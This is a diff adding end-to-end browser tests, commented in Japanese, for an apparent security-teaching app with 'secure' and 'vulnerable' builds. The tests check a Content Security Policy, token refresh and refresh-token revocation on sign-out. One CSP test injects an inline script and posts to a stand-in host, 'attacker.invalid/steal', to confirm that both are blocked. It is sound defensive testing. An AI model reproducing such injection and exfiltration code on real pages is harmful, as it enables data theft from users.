@@ -85,6 +85,138 @@ describe("顧客の希望から案を組み立てる（secure の本物の Claud
   });
 });
 
+describe("画面の CSP（D32）", () => {
+  it("secure: 仕込まれたインラインのスクリプトは動かず、許していない宛先へはつなげない", async () => {
+    alice = await new BrowserCustomer("secure", "alice").ready();
+    const page = alice.page;
+    const result = await page.evaluate(async () => {
+      const script = document.createElement("script");
+      script.textContent = "window.__injected = true;";
+      document.head.append(script);
+      const sent = await fetch("http://attacker.invalid/steal", { method: "POST", body: "x" }).then(() => "sent", (e: Error) => e.name);
+      const header = await fetch("/").then((r) => r.headers.get("content-security-policy"));
+      return { injected: (window as unknown as { __injected?: boolean }).__injected ?? false, sent, header };
+    });
+    expect(result.injected).toBe(false);
+    expect(result.sent).toBe("TypeError");
+    expect(result.header).toContain("script-src 'self'");
+    // 画面そのものは、CSP の下で動いている（ログインと登録まで済んでいる）
+    expect(await page.getByTestId("free-input").isVisible()).toBe(true);
+  });
+});
+
+describe("ログインの自動更新（vulnerable の台本。P-18）", () => {
+  const tokenRequests = (page: Page) => {
+    const refreshes: string[] = [];
+    page.on("request", (r) => {
+      if (r.url().endsWith("/protocol/openid-connect/token") && r.method() === "POST" && r.postData()?.includes("grant_type=refresh_token")) refreshes.push(r.url());
+    });
+    return refreshes;
+  };
+  const say = async (page: Page, text: string) => {
+    await page.getByTestId("free-input").fill(text);
+    await page.getByTestId("free-send").click();
+  };
+
+  it("A の残りが短ければ、回の前に更新し、断られずに会話が続く", async () => {
+    alice = await new BrowserCustomer("vulnerable", "alice").ready();
+    const page = alice.page;
+    // 残りの短い A に置き換えて読み直す。本物の A が送られるのは、更新できたときだけである
+    await page.evaluate(() => {
+      const session = JSON.parse(sessionStorage.getItem("session")!);
+      const payload = btoa(JSON.stringify({ exp: Math.floor(Date.now() / 1000) + 30 })).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
+      sessionStorage.setItem("session", JSON.stringify({ ...session, token: `x.${payload}.y` }));
+    });
+    await page.reload();
+    const refreshes = tokenRequests(page);
+    const statuses: number[] = [];
+    page.on("response", (r) => {
+      if (r.url().endsWith("/agui") && r.request().method() === "POST") statuses.push(r.status());
+    });
+    await say(page, "老後に備えたい");
+    await page.getByTestId("ask-option-0").waitFor();
+    expect(refreshes).toHaveLength(1);
+    expect(statuses).toEqual([200]);
+  });
+
+  it("営業 AI エージェントが 401 を返すと、1 度だけ更新して送り直す", async () => {
+    alice = await new BrowserCustomer("vulnerable", "alice").ready();
+    const page = alice.page;
+    const refreshes = tokenRequests(page);
+    let refused = 0;
+    await page.route("**/agui", async (route) => {
+      if (route.request().method() === "POST" && refused++ === 0) {
+        return route.fulfill({ status: 401, headers: { "access-control-allow-origin": "*" }, body: "{}" });
+      }
+      return route.continue();
+    });
+    await say(page, "老後に備えたい");
+    await page.getByTestId("ask-option-0").waitFor();
+    expect(refreshes).toHaveLength(1);
+    expect(refused).toBe(2);
+  });
+
+  /** 画面の中で、端末の鍵で更新を頼む（取り出せない鍵なので、画面の外では署名できない）。返すのは、状態と新しい更新のトークン。 */
+  const refreshInPage = (page: Page, tokenUrl: string, refreshToken: string) =>
+    page.evaluate(
+      async ({ tokenUrl, refreshToken }) => {
+        const pair = await new Promise<CryptoKeyPair>((resolve, reject) => {
+          const open = indexedDB.open("gekko-customer-app", 1);
+          open.onerror = () => reject(open.error);
+          open.onsuccess = () => {
+            const req = open.result.transaction("keys").objectStore("keys").get("dpop");
+            req.onsuccess = () => resolve(req.result as CryptoKeyPair);
+            req.onerror = () => reject(req.error);
+          };
+        });
+        const b64 = (bytes: ArrayBuffer | Uint8Array) => btoa(String.fromCharCode(...new Uint8Array(bytes as ArrayBuffer))).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
+        const text = (value: unknown) => b64(new TextEncoder().encode(JSON.stringify(value)));
+        const { kty, crv, x, y } = await crypto.subtle.exportKey("jwk", pair.publicKey);
+        const input = `${text({ alg: "ES256", typ: "dpop+jwt", jwk: { kty, crv, x, y } })}.${text({ htm: "POST", htu: tokenUrl, jti: crypto.randomUUID(), iat: Math.floor(Date.now() / 1000) })}`;
+        const signature = await crypto.subtle.sign({ name: "ECDSA", hash: "SHA-256" }, pair.privateKey, new TextEncoder().encode(input));
+        const res = await fetch(tokenUrl, {
+          method: "POST",
+          headers: { "content-type": "application/x-www-form-urlencoded", dpop: `${input}.${b64(signature)}` },
+          body: new URLSearchParams({ grant_type: "refresh_token", client_id: "customer-app", refresh_token: refreshToken }),
+        });
+        const body = (await res.json().catch(() => ({}))) as { refresh_token?: string; error_description?: string };
+        return { status: res.status, refreshToken: body.refresh_token, error: body.error_description };
+      },
+      { tokenUrl, refreshToken },
+    );
+
+  it("サインアウトすると、更新のトークンは使えない（D31）", async () => {
+    alice = await new BrowserCustomer("vulnerable", "alice").ready();
+    const page = alice.page;
+    const tokenUrl = `${publicOrigin("vulnerable", "login")}/realms/insurer/protocol/openid-connect/token`;
+    const before = (await page.evaluate(() => JSON.parse(sessionStorage.getItem("session")!).refreshToken)) as string;
+    // 同じ手順で、サインアウトの前には更新できる（手順の誤りで断られているのではないことを確かめる）
+    const renewed = await refreshInPage(page, tokenUrl, before);
+    expect(renewed.status, JSON.stringify(renewed)).toBe(200);
+
+    await page.getByTestId("signout").click();
+    await page.waitForURL(`${publicOrigin("vulnerable", "app")}/`, { timeout: 30_000 }).catch(() => undefined);
+    // ログインサーバーが確認の画面を出したら、押して終わらせる
+    const confirm = page.locator("input[name=confirmLogout], #kc-logout");
+    if (await confirm.count()) await confirm.first().click();
+    await page.getByTestId("login").waitFor({ timeout: 30_000 });
+
+    const after = await refreshInPage(page, tokenUrl, renewed.refreshToken!);
+    expect(after.status, JSON.stringify(after)).toBe(400);
+  });
+
+  it("更新できなければ、ログインし直しのカードを出す", async () => {
+    alice = await new BrowserCustomer("vulnerable", "alice").ready();
+    const page = alice.page;
+    await page.route("**/agui", (route) =>
+      route.request().method() === "POST" ? route.fulfill({ status: 401, headers: { "access-control-allow-origin": "*" }, body: "{}" }) : route.continue(),
+    );
+    await page.route("**/protocol/openid-connect/token", (route) => route.fulfill({ status: 400, headers: { "access-control-allow-origin": "*" }, contentType: "application/json", body: '{"error":"invalid_grant"}' }));
+    await say(page, "老後に備えたい");
+    await page.getByTestId("relogin").waitFor();
+  });
+});
+
 describe("カードで進む申込み（vulnerable の台本）", () => {
   const start = async () => {
     await setDefenses({});
